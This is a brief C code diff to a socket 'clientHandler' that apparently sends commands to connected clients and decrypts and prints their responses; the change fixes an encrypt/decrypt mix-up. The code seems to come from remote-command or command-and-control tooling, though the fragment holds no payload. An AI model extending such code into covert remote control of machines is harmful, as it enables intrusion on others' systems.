@@ -108,8 +108,8 @@ void clientHandler(SOCKET clientSocket)
         {
             printf("[!] Invalid Response");
         }
-        result[expectedBuffer] = '\0';
-        encrypt(command, result, expectedBuffer, expectedBuffer);
+        result[expectedBuffer] = CF_NULL;
+        decrypt(command, result, expectedBuffer, expectedBuffer);
         printf("%s\n", result);
     }
     if (quit)
